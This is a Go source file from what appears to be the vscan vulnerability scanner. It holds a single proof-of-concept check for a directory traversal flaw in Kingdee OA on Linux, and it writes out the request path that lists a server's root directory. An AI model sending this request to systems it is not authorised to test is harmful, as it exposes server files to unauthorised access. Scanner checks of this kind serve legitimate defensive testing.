package apusic

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//Linux金蝶OA server_file 目录遍历漏洞

func Linux_server_file(u string) bool {
	if req, err := pkg.HttpRequset(u+"/appmonitor/protected/selector/server_file/files?folder=/&suffix=", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "name") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln win金蝶OA server_file 目录遍历漏洞 |%s\n", u+"/appmonitor/protected/selector/server_file/files?folder=/&suffix="))
			return true
		}
	}
	return false
}
